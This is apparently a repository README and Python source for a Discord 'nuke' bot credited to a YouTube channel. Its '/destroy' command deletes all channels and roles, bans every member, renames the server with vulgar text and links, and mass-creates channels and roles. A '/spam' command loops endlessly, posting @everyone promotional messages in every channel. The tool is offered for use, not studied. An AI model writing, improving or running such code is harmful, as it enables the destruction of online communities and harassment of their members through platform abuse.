# Oron-YouTube-Discord-Servers-Fucker
Oron YouTube - https://www.youtube.com/channel/UCLCH5YUGkWdCckVTDUAQyFg
import discord, subprocess, sys, time, os, colorama, io, random
import asyncio
from discord.ext import commands

client = commands.Bot(description='Test', command_prefix = '/')
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='/', intents=intents, help_command=None)

players = {}

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

@client.event
async def on_ready():
    print('----------------------')
    print("""\
 __      __          ___                                        
/\ \  __/\ \        /\_ \                                       
\ \ \/\ \ \ \     __\//\ \     ___    ___     ___ ___      __   
 \ \ \ \ \ \ \  /'__`\\ \ \   /'___\ / __`\ /' __` __`\  /'__`\ 
  \ \ \_/ \_\ \/\  __/ \_\ \_/\ \__//\ \L\ \/\ \/\ \/\ \/\  __/ 
   \ `\___x___/\ \____\/\____\ \____\ \____/\ \_\ \_\ \_\ \____
    '\/__//__/  \/____/\/____/\/____/\/___/  \/_/\/_/\/_/\/____/
                                                                
                                                                
 ______            _____                           
/\__  _\          /\  __`\                         
\/_/\ \/   ___    \ \ \/\ \  _ __   ___     ___    
   \ \ \  / __`\   \ \ \ \ \/\`'__\/ __`\ /' _ `\  
    \ \ \/\ \L\ \   \ \ \_\ \ \ \//\ \L\ \/\ \/\ \ 
     \ \_\ \____/    \ \_____\ \_\\ \____/\ \_\ \_
      \/_/\/___/      \/_____/\/_/ \/___/  \/_/\/_/
                                                   
                                                   
 ____            ___       ___      ____            __      
/\  _`\         /\_ \    /'___\    /\  _`\         /\ \__   
\ \,\L\_\     __\//\ \  /\ \__/    \ \ \L\ \    ___\ \ ,_\  
 \/_\__ \   /'__`\\ \ \ \ \ ,__\    \ \  _ <'  / __`\ \ \/  
   /\ \L\ \/\  __/ \_\ \_\ \ \_/     \ \ \L\ \/\ \L\ \ \ \_ 
   \ `\____\ \____\/\____\\ \_\       \ \____/\ \____/\ \__
    \/_____/\/____/\/____/ \/_/        \/___/  \/___/  \/__/
                                                                               
        """)
@client.command(pass_context=True)
async def destroy(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name='FUCKED BY ORON',
            description="https://SstrixX.wtf",
            reason="https://SstrixX-selfbot.github.io",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(50):
        await ctx.guild.create_text_channel(name='oron-youtube')
    for _i in range(250):
        await ctx.guild.create_role(name='Oron YouTube', color=RandomColor())
@client.command(pass_context=True)
async def spam(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    while True:
        for channel in ctx.guild.channels:
            await channel.send('Fucked By Oron | Credit - YouTube Channel | https://www.youtube.com/channel/UCLCH5YUGkWdCckVTDUAQyFg | @everyone')

token = input("""              

 88888888b            dP                     
 88                   88                     
a88aaaa    88d888b. d8888P .d8888b. 88d888b. 
 88        88'  `88   88   88ooood8 88'  `88 
 88        88    88   88   88.  ... 88       
 88888888P dP    dP   dP   `88888P' dP       
                                             
dP    dP                            
Y8.  .8P                            
 Y8aa8P  .d8888b. dP    dP 88d888b. 
   88    88'  `88 88    88 88'  `88 
   88    88.  .88 88.  .88 88       
   dP    `88888P' `88888P' dP       
                                    
d888888P          dP                         
   88             88                         
   88    .d8888b. 88  .dP  .d8888b. 88d888b. 
   88    88'  `88 88888"   88ooood8 88'  `88 
   88    88.  .88 88  `8b. 88.  ... 88    88 
   dP    `88888P' dP   `YP `88888P' dP    dP               : """)

client.run(token)
